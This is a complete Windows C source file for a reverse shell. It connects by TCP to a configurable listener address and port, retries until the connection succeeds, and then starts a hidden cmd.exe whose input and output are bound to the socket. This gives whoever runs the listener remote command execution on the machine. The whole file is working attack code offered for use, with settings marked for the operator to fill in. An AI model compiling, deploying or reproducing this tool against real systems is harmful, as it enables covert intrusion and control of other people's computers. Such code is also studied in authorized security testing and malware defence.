#include <winsock2.h>
#include <ws2tcpip.h>
#include <stdio.h>
#include <tchar.h>

#pragma comment(lib, "Ws2_32.lib")

#define SERVER_ADDRESS "192.168.10.24"					    /* SET THE LISTENER IP HERE */
#define SERVER_PORT (int) 1337								/* SET THE LISTENER PORT HERE */
BOOL bTimeout = FALSE;										/* SET TRUE FOR TIMEOUT ERROR, FALSE TO WAIT FOR CONNECTION IN LOOP */

struct sockaddr_in saAddress;
SOCKET sSocket = INVALID_SOCKET;

int initializeWinsock();
int createSocket();
int connectFunction();
int spawnShell();

int main()
{

	initializeWinsock();
	createSocket();
	connectFunction();
	spawnShell();
	return EXIT_SUCCESS;
}

int initializeWinsock()
{
	WSADATA wsaData;
	int iResult;

	iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
	if (iResult != 0)
	{
		printf("[-] ERRO: WSAStartup faild - %d\n", iResult);
		return EXIT_FAILURE;
	}
	printf("[+] WinSock initialized\n");
	return EXIT_SUCCESS;
}

int createSocket()
{
	sSocket = WSASocketW(	AF_INET,		/* SAY IT WILL USE IPV4 */
							SOCK_STREAM,	/* SAY IT WILL BE A STEAM */
							IPPROTO_TCP,	/* SAY IT WILL BE A TCP PROTOCOL */
							NULL,			/* EXTRA INFORMATION ABOUT THE PROTOCOL */
							NULL,			/* SOCKET GROUP  */
							NULL );			/* EXTRA OPTION IN SOCKET DEFINITION */
	if (sSocket == INVALID_SOCKET)
	{
		printf("[-] ERRO: INVALID_SOCKET - %d\n", GetLastError());
		return EXIT_FAILURE;
	}

	// Use InetNtopW para converter o endereço IP
	if (InetPton(AF_INET, _T(SERVER_ADDRESS), &saAddress.sin_addr) != 1) {
		printf("[-] ERRO: Failed to convert IP address - %d\n", WSAGetLastError());
		closesocket(sSocket);
		WSACleanup();
		return EXIT_FAILURE;
	}
/*
	if (inet_pton(AF_INET, SERVER_ADDRESS, &saAddress.sin_addr) != 0)
	{
		printf("[-] ERRO: Faild to convert IP address - %d\n", WSAGetLastError());
		closesocket(sSocket);
		WSACleanup();
		return EXIT_FAILURE;
	}
*/
	saAddress.sin_family = AF_INET;
	saAddress.sin_port = htons(SERVER_PORT);

	printf("[+] Socket Created\n");
	return EXIT_SUCCESS;
}

int connectFunction()
{
	int iTries = 0;

	while (connect(sSocket, (struct sockaddr*)&saAddress, sizeof(saAddress)) != 0)
	{
		printf("[.] Waiting Connection...\n");
		Sleep(2000);
		iTries++;
		if (iTries == 10 && bTimeout == TRUE)
		{
			printf("[-] Connection Timeout\n");
			return EXIT_FAILURE;
		}
	}

	printf("[+] Connected to server.\n");

	return EXIT_SUCCESS;
}

int spawnShell()
{
	STARTUPINFO siInfo;
	memset(&siInfo, 0, sizeof(siInfo));
	siInfo.cb = sizeof(siInfo);
	siInfo.dwFlags = (STARTF_USESTDHANDLES);
	siInfo.hStdInput = (HANDLE)sSocket;
	siInfo.hStdOutput = (HANDLE)sSocket;
	siInfo.hStdError = (HANDLE)sSocket;
	PROCESS_INFORMATION piInfo;

	wchar_t commandLine[] = L"cmd";

	CreateProcessW(	NULL,
					commandLine,
					NULL,
					NULL,
					TRUE,
					CREATE_NO_WINDOW,
					NULL,
					NULL,
					&siInfo,
					&piInfo);

	return EXIT_SUCCESS;
}